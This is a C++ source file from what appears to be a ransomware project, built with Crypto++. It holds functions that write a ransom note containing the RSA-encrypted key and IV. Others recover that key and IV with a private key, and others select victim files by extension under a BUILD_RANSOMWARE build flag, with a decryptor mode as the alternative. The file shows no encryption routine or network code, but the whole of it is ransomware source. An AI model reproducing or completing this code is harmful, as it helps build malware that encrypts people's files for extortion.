#include <filesystem>
#include <fstream>
#include <iostream>
#include <unordered_set>
#include "config.h"
#include "crypto.h"
#include "cryptopp/cryptlib.h"
#include "cryptopp/rsa.h"

namespace fs = std::filesystem;

const std::unordered_set<std::string> EXTENSIONS = FILES_EXTENSIONS;

void saveRamsonFile(const std::string& encKeyIV) {
  if (!fs::exists(RAMSON_FILENAME)) {
    std::ofstream file(RAMSON_FILENAME);
    if (file.is_open()) {
      file << RAMSON_FILE_CONTENT_1 << std::endl;
      file << hexEncode(encKeyIV) << std::endl;
      file << RAMSON_FILE_CONTENT_2 << std::endl;
      file.close();
    }
  }
}

void recoverKeyIV(CryptoPP::RSA::PrivateKey& privateKey,
                  const std::string& encKeyIV,
                  std::string& recoveredKey,
                  std::string& recoveredIV) {
  try {
    std::string decKey = hexDecode(encKeyIV), recoveredKeyIV;
    rsaDecrypt(privateKey, decKey, recoveredKeyIV);
    size_t sep = recoveredKeyIV.find(":");
    if (sep > 0) {
      recoveredKey = recoveredKeyIV.substr(0, sep);
      recoveredIV = recoveredKeyIV.substr(sep + 1, recoveredKeyIV.length() - 1);
#if (DEBUG)
      std::cout << "Recovered Key: " << recoveredKey << std::endl;
      std::cout << "Recovered IV: " << recoveredIV << std::endl;
#endif
    }
  } catch (const std::exception& e) {
    std::cerr << "Invalid key" << std::endl;
  }
}

bool checkExtension(const fs::directory_entry& dir) {
#if (BUILD_RANSOMWARE)
  return ENABLE_EXTENSION_FILTERING
             ? EXTENSIONS.count(dir.path().extension().generic_string())
             : true;
#else
  return dir.path().extension().generic_string() == ENCRYPTED_FILE_EXTENSION;
#endif
}